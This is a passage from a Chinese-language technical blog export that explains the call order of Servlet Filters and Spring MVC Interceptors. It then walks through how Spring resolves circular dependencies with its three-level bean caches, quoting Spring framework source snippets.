<p>当请求经过多个Filter时，在操作<code>filterChain.doFilter(servletRequest, servletResponse);</code>前后调用的顺序</p>
<p><img src="/Users/qinsicheng/Library/Application%20Support/typora-user-images/image-20221124161334593.png" alt="image-20221124161334593"></p>
<p>​    <strong>这里需注意</strong>：在最后一个Filter的doFilter的filterChain.doFilter(servletRequest, servletResponse);调用完后数据就返回页面了，然后才开始操作后面的操作。</p>
<h3 id="Interceptor"><a href="#Interceptor" class="headerlink" title="Interceptor"></a>Interceptor</h3><blockquote>
<p>如何使用？</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Interceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[ Interceptor ]：执行 preHandle 方法。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">ModelAndView</span> modelAndView<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[ Interceptor ]：执行 postHandle 方法。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterCompletion</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[ Interceptor ]：执行 afterCompletion 方法。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">&#123;</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">Interceptor</span> interceptor<span class="token punctuation">;</span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">Interceptor1</span> interceptor1<span class="token punctuation">;</span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">Interceptor2</span> interceptor2<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addInterceptors</span><span class="token punctuation">(</span><span class="token class-name">InterceptorRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span>interceptor<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span>interceptor1<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span>interceptor2<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>生命周期</p>
</blockquote>
<p>​    和Filter 是类似的，先顺序执行preHandle，再逆序执行postHandle，所有执行完后，逆序执行afterCompletion方法。</p>
<p>​    这里注意：最后一个preHandle处理完后，开始执行业务，在执行postHandler前， 页面就已经被渲染了。也就是Controller返回数据后执行：<code>this.returnValueHandlers.handleReturnValue(returnValue, this.getReturnValueType(returnValue), mavContainer, webRequest);</code>。</p>
<blockquote>
<p>如何控制拦截器的执行顺序</p>
</blockquote>
<p>​    在WebMvcConfigurer配置类中，按照注册的顺序执行。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>当同时使用拦截器与过滤器时，请求模型：</li>
</ol>
<p><img src="../../typora-user-images/image-20221124165341727.png" alt="image-20221124165341727"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Filter</tag>
        <tag>Interceptor</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring如何解决循环依赖</title>
    <url>//post/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96.html</url>
    <content><![CDATA[<h2 id="Spring循环依如何解决？"><a href="#Spring循环依如何解决？" class="headerlink" title="Spring循环依如何解决？"></a>Spring循环依如何解决？</h2><blockquote>
<p>循环依赖是什么？</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
  <span class="token class-name">B</span> b<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>
  <span class="token class-name">A</span> a<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//简单来说就是A的创建依赖于B，B的创建依赖于A。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>在一般场景下，如何解决循环依赖的问题？</p>
<p>我们知道对象的创建一般有：</p>
<p>​    无参构造器+属性Set方法初始化对象</p>
<p>​    有参构造器直接初始化对象</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//通过有参构造器初始化</span>
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
  <span class="token class-name">B</span> b<span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">B</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> b<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>
  <span class="token class-name">A</span> a<span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token class-name">A</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> a<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> client<span class="token punctuation">&#123;</span>
  <span class="token comment">//我们发现会无限套娃下去，有参构造器方法不能使用</span>
  <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//通过无参参构造器初始化</span>
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
  <span class="token class-name">B</span> b<span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setB</span><span class="token punctuation">(</span><span class="token class-name">B</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> b<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>
  <span class="token class-name">A</span> a<span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setA</span><span class="token punctuation">(</span><span class="token class-name">A</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> a<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> client<span class="token punctuation">&#123;</span>
  <span class="token comment">//可以发现无参构造器+set方法可以完成任务</span>
  <span class="token class-name">A</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">B</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a<span class="token punctuation">.</span><span class="token function">setB</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
  b<span class="token punctuation">.</span><span class="token function">setA</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>通过上面的场景，我们就可以知道利用Set方法可以解决循环依赖，那在Spring中也是如此，但增加了亿丝细节</p>
</blockquote>
<blockquote>
<p>我们在使用Spring时，常讲Spring容器，也就是我们不去new对象，而是从容器中取对象，那这个容器到底是什么？</p>
</blockquote>
<p>​    容器顾名思义，就是存放数据对象的地方，又是在内存中的，每次我们向容器里取对象时都会提供一个对象名，或者是类型信息，然后容器返回相应的数据，那在Java基础中，我们学习到的Map结构，就很符合这样要求，通过Key，Value来存储对象信息。所以其实Spring容器就是通过一个Map来实现的，也就是这个家伙<code>Map&lt;String, Object&gt; singletonObjects</code>,但更确切的来说它叫做一级缓存，专门存放已经完整经过生命周期的对象（对象初始化后，参数也赋值了）。那既然有一级缓存就可能有其他级缓存，确实Spring有三层缓存，而这三层缓存就是来解决循环依赖的关键！！！</p>
<blockquote>
<p>三级缓存为哪三级，分别是干嘛的？</p>
</blockquote>
<ol>
<li><code>singletonObjects</code>:一级缓存存放完整生命周期的Bean，我们从容器中取对象，就从这里找的。</li>
<li><code>earlySingletonObjects</code>:二级缓存存放半生命周期的Bean，可以理解为通过无参构造器向堆空间申请内存了，但是没有对属性赋值。</li>
<li><code>singletonFactories</code>:三级缓存存放刚实例化的对象，与二级缓存类似</li>
</ol>
<blockquote>
<p>我们知道Spring容器中可以设置对象为多例模式和单例模式，每种模式都可以解决循环依赖问题吗？</p>
</blockquote>
<blockquote>
<p>单例模式我们知道是存放在一级缓存中的，那<em>prototype</em>模式的对象是否也在一级缓存中？</p>
</blockquote>
<p>下面我们先来看看当创建prototype对象时，底层发生了什么</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> requiredType<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">assertBeanFactoryActive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  	<span class="token comment">//获取目标bean</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> requiredType<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> requiredType<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//一般do开头的方法都是干实事儿的，重点关注</span>
   <span class="token keyword">return</span> <span class="token function">doGetBean</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> requiredType<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// Eagerly check singleton cache for manually registered singletons.  </span>
<span class="token comment">// 可以看到不管是不是单例模式都会来一级缓存寻找，但是这里没有找到</span>
<span class="token class-name">Object</span> sharedInstance <span class="token operator">=</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>typeCheckOnly<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//标记对象是否创建过了</span>
   <span class="token function">markBeanAsCreated</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//这里只有第一次创建时会进来，标记为该类型对象已经创建，第二次获取bean实例时就知道之前已经创建了，直接退出</span>
<span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">markBeanAsCreated</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>alreadyCreated<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>mergedBeanDefinitions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>alreadyCreated<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// Let the bean definition get re-merged now that we're actually creating</span>
            <span class="token comment">// the bean... just in case some of its metadata changed in the meantime.</span>
            <span class="token function">clearMergedBeanDefinition</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token comment">//这里记录之前创建过的对象</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>alreadyCreated<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//判断是否为isPrototypel类型对象</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">isPrototype</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token comment">// It's a prototype -> create a new instance.</span>
   <span class="token class-name">Object</span> prototypeInstance <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token function">beforePrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token comment">//这里就要创建prototypeInstance实例了</span>
      prototypeInstance <span class="token operator">=</span> <span class="token function">createBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
   <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
      <span class="token function">afterPrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
  <span class="token comment">//重点</span>
   bean <span class="token operator">=</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>prototypeInstance<span class="token punctuation">,</span> name<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">createBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">RootBeanDefinition</span> mbd<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>
      <span class="token keyword">throws</span> <span class="token class-name">BeanCreationException</span> <span class="token punctuation">&#123;</span>

   <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Creating instance of bean '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
   <span class="token class-name">RootBeanDefinition</span> mbdToUse <span class="token operator">=</span> mbd<span class="token punctuation">;</span>

   <span class="token comment">// Make sure bean class is actually resolved at this point, and</span>
  	<span class="token comment">//在动态解析类的情况下克隆bean定义</span>
   <span class="token comment">// clone the bean definition in case of a dynamically resolved Class</span>
   <span class="token comment">// which cannot be stored in the shared merged bean definition.</span>
   <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> resolvedClass <span class="token operator">=</span> <span class="token function">resolveBeanClass</span><span class="token punctuation">(</span>mbd<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span>resolvedClass <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>mbd<span class="token punctuation">.</span><span class="token function">hasBeanClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> mbd<span class="token punctuation">.</span><span class="token function">getBeanClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      mbdToUse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RootBeanDefinition</span><span class="token punctuation">(</span>mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>
      mbdToUse<span class="token punctuation">.</span><span class="token function">setBeanClass</span><span class="token punctuation">(</span>resolvedClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token comment">// Prepare method overrides.</span>
   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      mbdToUse<span class="token punctuation">.</span><span class="token function">prepareMethodOverrides</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
   <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeanDefinitionValidationException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinitionStoreException</span><span class="token punctuation">(</span>mbdToUse<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            beanName<span class="token punctuation">,</span> <span class="token string">"Validation of method overrides failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// Give BeanPostProcessors a chance to return a proxy instead of the target bean instance.</span>
      <span class="token class-name">Object</span> bean <span class="token operator">=</span> <span class="token function">resolveBeforeInstantiation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbdToUse<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">return</span> bean<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>
   <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>mbdToUse<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span>
            <span class="token string">"BeanPostProcessor before instantiation of bean failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
			<span class="token comment">//这里do开头，是重点</span>
      <span class="token class-name">Object</span> beanInstance <span class="token operator">=</span> <span class="token function">doCreateBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbdToUse<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Finished creating instance of bean '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">return</span> beanInstance<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// No special handling: simply use no-arg constructor.</span>
<span class="token comment">// 要通过无参构造器创建了</span>
<span class="token keyword">return</span> <span class="token function">instantiateBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//获取实例化策略，然后实例化对象</span>
beanInstance <span class="token operator">=</span> <span class="token function">getInstantiationStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span>mbd<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * Return the instantiation strategy to use for creating bean instances.
 */</span>
<span class="token keyword">protected</span> <span class="token class-name">InstantiationStrategy</span> <span class="token function">getInstantiationStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>instantiationStrategy<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//马上要创建了</span>
<span class="token keyword">return</span> <span class="token class-name">BeanUtils</span><span class="token punctuation">.</span><span class="token function">instantiateClass</span><span class="token punctuation">(</span>constructorToUse<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//利用反射要真正创建实例了</span>
<span class="token keyword">return</span> ctor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>argsWithDefaultValues<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">B</span> b<span class="token punctuation">;</span>

